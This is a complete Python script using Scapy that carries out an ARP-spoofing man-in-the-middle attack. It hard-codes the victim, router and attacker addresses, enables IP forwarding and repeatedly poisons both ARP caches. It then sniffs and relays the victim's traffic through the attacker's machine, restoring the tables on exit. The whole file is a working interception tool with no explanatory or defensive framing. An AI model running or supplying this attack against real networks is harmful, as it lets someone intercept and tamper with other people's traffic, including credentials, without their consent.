from scapy.all import *
import os
import sys
import time
import threading

iface = "wlo1"
victim_ip = "192.168.100.4"
router_ip = "192.168.100.1"
router_mac = ""
victim_mac = "0a:d6:89:76:ea:2a"
attacker_mac = "f8:54:f6:81:05:31"

def enable_ip_forwarding():
    print("\n[+] Enabling IP forwarding...\n")
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def disable_ip_forwarding():
    print("\n[-] Disabling IP forwarding...\n")
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')

def get_mac(IP):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=5, verbose=0)
    for s, r in ans:
        return r[Ether].src
    return None

def overview():
    print("=" * 50)
    print("MITM Configuration:")
    print("=" * 50)
    print(f"Victim IP:    {victim_ip}")
    print(f"Victim MAC:   {victim_mac}")
    print(f"Router IP:    {router_ip}")
    print(f"Router MAC:   {router_mac}")
    print(f"Attacker MAC: {attacker_mac}")
    print("=" * 50)

def spoof():
    """Send ARP replies to poison both victim and router"""
    if router_mac is None:
        print("[!] Router MAC wasn't found")
        sys.exit(1)
    
    # Tell router that victim_ip is at attacker_mac
    sendp(Ether(dst=router_mac)/ARP(op=2,
                                     hwsrc=attacker_mac,
                                     hwdst=router_mac,
                                     psrc=victim_ip,
                                     pdst=router_ip), 
          iface=iface, verbose=0)
    
    if victim_mac is None:
        print("[!] Victim MAC wasn't found")
        sys.exit(1)
    
    # Tell victim that router_ip is at attacker_mac
    sendp(Ether(dst=victim_mac)/ARP(op=2,
                                     hwsrc=attacker_mac,
                                     hwdst=victim_mac,
                                     psrc=router_ip,
                                     pdst=victim_ip), 
          iface=iface, verbose=0)

def restore():
    """Restore original ARP tables"""
    print("\n[*] Restoring ARP tables...")
    
    # Restore router's ARP table
    sendp(Ether(dst=router_mac)/ARP(op=2,
                                     pdst=router_ip,
                                     psrc=victim_ip,
                                     hwdst=router_mac,
                                     hwsrc=victim_mac), 
          count=5, iface=iface, verbose=0)
    
    # Restore victim's ARP table
    sendp(Ether(dst=victim_mac)/ARP(op=2,
                                     pdst=victim_ip,
                                     psrc=router_ip,
                                     hwdst=victim_mac,
                                     hwsrc=router_mac), 
          count=5, iface=iface, verbose=0)
    
    print("[+] ARP tables restored")
    disable_ip_forwarding()

def handle_packet(packet):
    """Forward packets between victim and router"""
    
    # Ignore ARP packets to avoid loops
    if ARP in packet:
        return
    
    # Packet from victim to router
    if packet[Ether].src == victim_mac and packet[Ether].dst == attacker_mac:
        packet[Ether].src = attacker_mac
        packet[Ether].dst = router_mac
        sendp(packet, iface=iface, verbose=0)
        print(f"[→] Forwarding: {packet[IP].src} -> {packet[IP].dst}")
    
    # Packet from router to victim
    elif packet[Ether].src == router_mac and packet[Ether].dst == attacker_mac:
        packet[Ether].src = attacker_mac
        packet[Ether].dst = victim_mac
        sendp(packet, iface=iface, verbose=0)
        print(f"[←] Forwarding: {packet[IP].src} -> {packet[IP].dst}")

def spoof_loop():
    """Continuously send ARP spoofing packets"""
    print("[*] Starting ARP spoofing loop...")
    while True:
        try:
            spoof()
            time.sleep(2)
        except KeyboardInterrupt:
            break

def main():
    global router_mac, victim_mac
    
    # Enable IP forwarding
    enable_ip_forwarding()
    
    # Get MAC addresses
    print("[*] Resolving MAC addresses...")
    # victim_mac = get_mac(victim_ip)
    # if not victim_mac:
    #     print(f"[!] Could not resolve MAC for {victim_ip}")
    #     sys.exit(1)
    
    router_mac = get_mac(router_ip)
    if not router_mac:
        print(f"[!] Could not resolve MAC for {router_ip}")
        sys.exit(1)
    
    overview()
    
    # Start ARP spoofing in a separate thread
    spoof_thread = threading.Thread(target=spoof_loop, daemon=True)
    spoof_thread.start()
    
    print("\n[*] Starting packet forwarding...")
    print("[*] Press Ctrl+C to stop\n")
    
    try:
        # Sniff and forward packets
        sniff(prn=handle_packet, 
              filter=f"ip and (ether src {victim_mac} or ether src {router_mac})",
              iface=iface, 
              store=0)
    except KeyboardInterrupt:
        print("\n[*] Stopping MITM attack...")
        restore()
        sys.exit(0)

if __name__ == "__main__":
    main()